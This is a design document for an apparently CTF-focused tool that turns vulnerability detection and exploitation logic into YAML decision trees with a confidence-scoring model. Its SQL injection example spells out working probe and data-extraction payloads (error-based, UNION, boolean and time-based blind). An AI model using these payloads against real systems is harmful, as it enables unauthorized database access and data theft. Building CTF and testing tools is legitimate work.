# YAML-Based Decision Trees — Design & Refactor Plan

## Problem Statement

The current Python-based decision trees are hardcoded logic that requires code changes to add or modify detection/exploitation paths. The goal is to replace them with **declarative YAML decision trees** that are plug-and-play, autodiscovered, and confidence-driven.

---

## Core Design Concepts

### 1. Confidence Model

Confidence is **accumulated**, not set once. Multiple signals compound:

```
initial_confidence (from passive precondition hints)
  + detection_path_signals (each probe step adds/subtracts weight)
  = final_confidence_score per vuln type  [hard capped at 1.0]
```

Before any tree even runs, passive observations (found `/admin`, tech stack is PHP, param named `id`) seed the confidence pool via **confidence seeds**. Only trees above a `min_confidence` threshold are dispatched. This prevents wasting time — a React SPA will not trigger SQLi or LFI trees unless there's a strong positive signal.

#### Confidence Model — Formal Rules

Three problems must be explicitly prevented:

**Problem 1 — Infinite Boosting**
Hard cap at `1.0`. Boosts use **diminishing returns** rather than raw addition:

```
new_score = old_score + boost * (1 - old_score)
```

This naturally approaches `1.0` asymptotically. A score of `0.60` receiving a `+0.85` boost becomes `0.60 + 0.85 * 0.40 = 0.94`, not `1.45`. Six small `+0.20` boosts from `0.0` produce `~0.74`, not `1.20`.

**Problem 2 — Double-Counting**
Each boost source has a unique `source_id` (format: `<phase>:<tree_id>:<signal_or_seed_label>`). The confidence pool tracks **provenance** — a `(source_id, vuln_id)` pair can only fire once per run. Subsequent firings of the same source are silently ignored.

```
# Provenance record stored alongside the score
confidence_pool["sqli"] = {
    "score": 0.94,
    "sources": [
        {"id": "seed:web_sqli:sensitive_path_found",     "boost": 0.25, "applied": 0.25},
        {"id": "seed:web_sqli:php_tech_stack",           "boost": 0.15, "applied": 0.11},
        {"id": "detection:web_sqli:error_based_confirmed","boost": 0.85, "applied": 0.58}
    ]
}
```

**Problem 3 — Exploitation Paths Writing Back**
Exploitation paths are **read-only consumers** of the confidence pool. They may read scores to determine ordering but cannot emit confidence boosts or modify the pool. This is enforced at the executor level — the confidence pool is frozen (immutable) once the exploitation phase begins.

```
Phase boundary:
  Detection complete → confidence pool FROZEN → Exploitation begins
  Any exploit-phase emit: confidence_boost is a schema validation error
```

**Problem 4 — Cross-Tree Interference**
Two trees probing the same parameters (e.g., `web_sqli` and `web_cmdi`) must not reinforce each other's confidence scores. This is solved with a **two-tier architecture**:

```
Tier 1 — Shared Observations  (read-only for all trees)
  context.observations = {
      "found_paths": ["/admin", "/login"],
      "tech_stack": ["php"],
      "params": ["id", "user"],
      ...
  }
  ↑ Any tree or recon step can WRITE new facts here.
  ↓ Any tree can READ from here.

Tier 2 — Private Confidence Namespace  (one per tree, isolated)
  confidence["web_sqli"]  = { "score": 0.60, "sources": [...] }
  confidence["web_cmdi"]  = { "score": 0.45, "sources": [...] }
  confidence["web_lfi"]   = { "score": 0.30, "sources": [...] }
  ↑ Only the owning tree may write to its namespace.
  ↓ All trees may read any namespace (for UI display / ordering).
```

**Rules:**
- Seeds in `web_sqli` read from `context.observations` and write to `confidence["web_sqli"]` only.
- `web_cmdi` finding a vulnerable parameter does **not** change `confidence["web_sqli"]`.
- Signals are **namespaced to their tree**: `web_sqli:error_based_confirmed` ≠ `web_cmdi:error_based_confirmed`.
- A tree's exploit paths may only `requires_signal` signals from the **same tree** (validated at load time).
- Cross-tree reading of `context.observations` is the only legitimate cross-tree interaction.

```yaml
# VALID — web_sqli seed reads a shared observation
confidence_seeds:
  - if: "'/admin' in context.observations.found_paths"
    boost: 0.25     # writes to confidence["web_sqli"] only

# INVALID — a tree cannot reference another tree's confidence namespace
# This is a schema validation error:
confidence_seeds:
  - if: "confidence['web_cmdi'].score > 0.5"    # ← rejected at load time
    boost: 0.10
```

The UI renders each tree's confidence namespace independently, making interference impossible to accidentally introduce.

---

### 2. Execution Model

```
Detection Phase:
  - Evaluate confidence seeds for all registered trees
  - Discard trees below min_confidence threshold
  - Run ALL qualified detection paths concurrently
  - Steps within each path run sequentially
  - Surface first success immediately to UI
  - Continue finding remaining paths in background
  - Each detection path emits signals + confidence boosts

Exploitation Phase:
  - Collect all emitted signals from detection
  - Match exploit paths where requires_signal is satisfied
  - Sort by accumulated confidence DESC (high → medium → low)
  - Run exploitation paths in order
  - stop_on_flag: true halts everything on flag match
  - Report partial results as each path completes
```

---

### 3. Conditional Rules — Custom Mini-Language

Rules use a **custom mini-language** (not Python eval — safe, sandboxed, constrained). No arbitrary code execution. Conditions reference a shared `context` object via dot-notation.

#### Supported Operators

```
==  !=  >  <  >=  <=
in  not in  contains  starts_with  ends_with
and  or  not
len(x)  any(list)  all(list)
```

#### Context Variables

```
context.challenge.type          # string: web | pwn | crypto | forensics | misc
context.tech_stack              # list of strings  [shared observations tier]
context.found_paths             # list of URL paths discovered  [shared observations tier]
context.params                  # list of parameter names  [shared observations tier]
context.response_time           # int (milliseconds)  [shared observations tier]
context.observations.*          # any fact written by any prior recon/tree step

# NOTE: confidence[other_tree] is NOT accessible in seed/step conditions.
# Seeds may only produce boosts into their own tree's namespace.
# Signals are always tree-scoped: "web_sqli:error_based_confirmed"
```

#### Example Conditions

```yaml
"context.challenge.type == 'web'"
"'/admin' in context.found_paths"
"'react' not in context.tech_stack"
"context.confidence.sqli >= 0.4"
"len(context.params) > 0"
"any(p in context.params for p in ['id','user','item'])"
```

---

### 4. Signal/Emit System

Detection and exploitation paths are wired together via **named signals**:

- Detection steps `emit: signal_name` when a condition is matched
- Exploitation paths declare `requires_signal: signal_name`
- An exploit path is only queued if its required signal has been emitted
- This creates a clean, auditable data flow from detection → exploitation

---

### 5. Autodiscovery

The loader scans `trees/**/*.yaml` on startup, validates the schema, and registers each tree by `id`. Trees are hot-reloadable at runtime via API.

```
trees/
  web/
    sqli.yaml
    lfi.yaml
    xss.yaml
    auth_bypass.yaml
    command_injection.yaml
  pwn/
    buffer_overflow.yaml
    format_string.yaml
    rop_chain.yaml
  crypto/
    weak_rsa.yaml
    weak_cipher.yaml
  forensics/
    hidden_data.yaml
    steganography.yaml
```

---

## YAML Schema

### Full Annotated Example (`trees/web/sqli.yaml`)

```yaml
# ─── Tree Metadata ────────────────────────────────────────────────────────────
id: web_sqli
name: SQL Injection
category: web            # web | pwn | crypto | forensics | steganography | misc
version: "1.0"
author: system
description: >
  Detects and exploits SQL injection via error-based, boolean-based,
  time-based, and union-based techniques.

# ─── Preconditions ────────────────────────────────────────────────────────────
# Tree is only loaded into the candidate pool if ALL of these pass.
# Uses the custom mini-language.
applies_when:
  - "context.challenge.type == 'web'"
  - "len(context.params) > 0"

# ─── Confidence Seeds ─────────────────────────────────────────────────────────
# Passive signals that boost/reduce confidence BEFORE any probing starts.
# These fire from prior observations (recon, asset classification, etc.)
# Negative boosts prune irrelevant trees early.
confidence_seeds:
  - if: "'/login' in context.found_paths or '/admin' in context.found_paths"
    boost: 0.25
    label: "Sensitive path found"

  - if: "'php' in context.tech_stack or 'asp' in context.tech_stack"
    boost: 0.15
    label: "Server-side language detected"

  - if: "any(p in context.params for p in ['id','user','item','cat','page'])"
    boost: 0.20
    label: "Numeric/ID-style parameter found"

  - if: "'react' in context.tech_stack or 'vue' in context.tech_stack or 'angular' in context.tech_stack"
    boost: -0.30
    label: "SPA framework detected (reduces server-side SQLi likelihood)"

# ─── Detection Paths ──────────────────────────────────────────────────────────
# ALL paths whose min_confidence is met run concurrently.
# Steps within a path run sequentially.
# First success surfaces to UI immediately; all paths continue.
detection:
  min_confidence: 0.10    # global floor; individual paths can override

  paths:

    - id: error_based
      name: "Error-Based Detection"
      description: "Inject quote characters, look for DB error strings in response"
      min_confidence: 0.10
      steps:

        - id: single_quote_probe
          action: http_probe
          with:
            payloads: ["'", "''", "\"", "`"]
            inject_into: all_params
            method: GET
          signals:
            - match: "SQL syntax|mysql_fetch_array|ORA-[0-9]+|sqlite.*error|pg_query"
              in: response.body
              on_match:
                confidence_boost: 0.85
                emit: error_based_confirmed
              on_no_match:
                confidence_boost: 0.0
          on_success: null    # terminal step — signal emitted
          on_failure: null

    - id: boolean_based
      name: "Boolean-Based Blind Detection"
      description: "Compare true/false condition responses for body differences"
      min_confidence: 0.10
      steps:

        - id: true_false_probe
          action: http_probe
          with:
            true_payload: "' AND 1=1--"
            false_payload: "' AND 1=2--"
            inject_into: all_params
          signals:
            - match:
                condition: "true_response.body != false_response.body"
              on_match:
                confidence_boost: 0.70
                emit: boolean_based_confirmed
          on_success: null
          on_failure: null

    - id: time_based
      name: "Time-Based Blind Detection"
      description: "Inject sleep payloads, measure response time delta"
      min_confidence: 0.05    # lower floor — last resort technique
      steps:

        - id: sleep_probe
          action: http_probe
          with:
            payloads:
              mysql: "' AND SLEEP(3)--"
              postgres: "'; SELECT pg_sleep(3)--"
              mssql: "'; WAITFOR DELAY '0:0:3'--"
            inject_into: all_params
          signals:
            - match:
                condition: "response_time >= 3000"
              on_match:
                confidence_boost: 0.65
                emit: time_based_confirmed
          on_success: null
          on_failure: null

    - id: union_based
      name: "UNION-Based Detection"
      description: "Determine UNION column count, check for reflected output"
      min_confidence: 0.10
      steps:

        - id: column_count_probe
          action: http_probe
          with:
            payloads:
              - "' ORDER BY 1--"
              - "' ORDER BY 2--"
              - "' ORDER BY 3--"
              - "' ORDER BY 4--"
              - "' ORDER BY 5--"
            inject_into: all_params
            stop_on_error: true    # stop when ORDER BY N causes error → N-1 is count
          signals:
            - match: "Unknown column|ORDER BY"
              in: response.body
              on_match:
                confidence_boost: 0.60
                emit: union_column_count
                capture:
                  as: union_col_count
                  from: last_successful_n

# ─── Exploitation Paths ───────────────────────────────────────────────────────
# Sorted by accumulated confidence at runtime (DESC).
# stop_on_flag: true halts all paths when a flag is captured.
exploitation:
  stop_on_flag: true
  order_by: confidence

  paths:

    - id: error_extract
      name: "Error-Based Data Extraction"
      requires_signal: error_based_confirmed
      technique: error_based
      steps:

        - id: extract_db_name
          action: http_probe
          with:
            payload: "' AND extractvalue(1,concat(0x7e,(SELECT database())))--"
            inject_into: vulnerable_param    # set by detection phase
          capture:
            - pattern: "~(\\w+)"
              in: response.body
              as: db_name
          on_success: extract_tables
          on_failure: null

        - id: extract_tables
          action: http_probe
          with:
            payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--"
            inject_into: vulnerable_param
          capture:
            - pattern: "~([\\w,]+)"
              in: response.body
              as: table_names
          on_success: extract_flag
          on_failure: null

        - id: extract_flag
          action: http_probe
          with:
            payload: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM {{ captures.table_names | first_word }})))--"
            inject_into: vulnerable_param
          capture:
            - pattern: "flag\\{[^}]+\\}"
              in: response.body
              as: flag

    - id: union_extract
      name: "UNION-Based Data Extraction"
      requires_signal: union_column_count
      technique: union_based
      steps:
        # Steps use captures.union_col_count to build correct UNION payload
        - id: union_flag_dump
          action: http_probe
          with:
            payload: "' UNION SELECT {{ union_null_columns(captures.union_col_count, 'flag') }} FROM flags--"
            inject_into: vulnerable_param
          capture:
            - pattern: "flag\\{[^}]+\\}"
              in: response.body
              as: flag

    - id: boolean_blind_extract
      name: "Boolean Blind Bit-by-Bit Extraction"
      requires_signal: boolean_based_confirmed
      technique: boolean_blind
      steps:
        - id: blind_extract
          action: blind_extract
          with:
            true_template: "' AND SUBSTRING((SELECT flag FROM flags),{pos},1)='{char}'--"
            inject_into: vulnerable_param
            target_table: flags
            target_column: flag
          capture:
            - as: flag
              from: extracted_string

    - id: time_blind_extract
      name: "Time-Based Blind Extraction"
      requires_signal: time_based_confirmed
      technique: time_blind
      steps:
        - id: time_extract
          action: time_based_extract
          with:
            payload_template: "' AND IF(SUBSTRING((SELECT flag FROM flags),{pos},1)='{char}',SLEEP(2),0)--"
            inject_into: vulnerable_param
          capture:
            - as: flag
              from: extracted_string
```

---

## Loader & Registry

### Behavior

1. On startup, scan `trees/**/*.yaml`
2. Validate each file against the schema (fail loudly on invalid)
3. Register by `id` — duplicate `id` raises an error
4. Log: `Loaded 12 decision trees across 4 categories`

### API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/rules` | List all loaded trees: id, name, category, version, enabled, detection path count, exploit path count |
| `GET` | `/rules/{id}` | Full parsed tree definition + enabled status |
| `POST` | `/rules/reload` | Rescan `trees/**/*.yaml`, hot-reload all trees |
| `PATCH` | `/rules/{id}` | `{"enabled": false}` — disable a tree without removing the file |

---

## UI Integration

### Rules Panel (new UI section)

- Table of all loaded trees: Name, Category, Version, Detection Paths, Exploit Paths, Enabled toggle
- Click a tree → expanded view of YAML definition
- "Reload Rules" button → calls `POST /rules/reload`
- Filter by category

### Live Run View (additions to existing dashboard)

- **Confidence Pool** — bar chart of confidence scores per vuln type, updates live
- **Active Detection Paths** — which paths are running / succeeded / skipped (with reason)
- **Signals Emitted** — timestamped audit trail: `[12:03:01] error_based_confirmed emitted by web_sqli/error_based`
- **Exploitation Queue** — ordered list with confidence score, status per path

---

## Implementation Order

1. **YAML schema validator + loader** — load, validate, register trees from `trees/**/*.yaml`
2. **Mini-language expression evaluator** — parse and evaluate `if:` conditions safely
3. **Confidence pool manager** — accumulate seeds + detection boosts, gate tree dispatch
4. **Runtime executor** — concurrency model (concurrent paths, sequential steps), signal bus
5. **API endpoints** — `/rules`, `/rules/reload`, `/rules/{id}`, `PATCH /rules/{id}`
6. **UI panel** — rules table, live confidence view, signal audit trail
7. **Port existing Python trees to YAML** — convert all trees in `trees/` to the new format

---

## Decisions Log

| Topic | Decision | Rationale |
|---|---|---|
| Expression language | Custom mini-language | Safe sandboxing; no arbitrary code execution |
| Detection execution | Concurrent paths, sequential steps | Fast without complex coordination overhead |
| Detection → Exploitation wiring | Signal/emit system | Clean, auditable, decoupled |
| Autodiscovery scope | `trees/**/*.yaml` in package dir | Simple, predictable, no config needed |
| Exploitation ordering | Confidence DESC | Most probable exploits run first |
| Flag found behavior | `stop_on_flag: true` halts all paths | No wasted work after success |
| Confidence accumulation | Diminishing returns formula | Prevents overflow without needing a clamp; large late boosts still matter |
| Double-counting prevention | Provenance tracking per `(source_id, vuln_id)` | Same signal cannot boost the same vuln twice in one run |
| Exploit phase write-back | Confidence pool frozen at phase boundary | Exploits cannot inflate their own priority mid-run |
| Cross-tree interference | Two-tier architecture: shared observations (R/W by all) + private confidence namespace (W by owner only) | Trees probe the same params without reinforcing each other |
| Signal namespacing | Signals scoped as `tree_id:signal_name` | `web_sqli:error_based_confirmed` ≠ `web_cmdi:error_based_confirmed`; cross-tree `requires_signal` is a load-time validation error |
